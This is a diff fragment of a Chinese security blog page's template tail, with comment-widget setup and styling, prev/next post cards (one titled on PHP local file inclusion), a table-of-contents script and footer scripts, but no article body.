+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'http://atmujie.github.io/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/';
+        this.page.identifier = '/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/';
+        this.page.title = '菜鸟随笔-PHP裸文件本地包含';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
+        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="菜鸟随笔-PHP裸文件本地包含">
+                        
+                        <span class="card-title">菜鸟随笔-PHP裸文件本地包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-02
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/28/%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8Fmysql/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="伪造恶意mysql">
+                        
+                        <span class="card-title">伪造恶意mysql</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
